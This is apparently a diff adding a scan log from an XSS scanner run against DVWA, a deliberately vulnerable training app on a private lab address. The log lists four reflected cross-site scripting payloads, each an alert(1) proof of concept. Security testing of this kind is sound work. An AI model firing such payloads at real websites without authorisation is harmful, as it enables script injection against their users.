@@ -1,0 +1,5 @@
+[+] Starting XSS scan on: http://192.168.56.101/dvwa/vulnerabilities/xss_r/
+[!] Payload reflected: <script>alert(1)</script>
+[!] Payload reflected: "><svg/onload=alert(1)>
+[!] Payload reflected: ';alert(1);//
+[!] Payload reflected: <img src=x onerror=alert(1)>
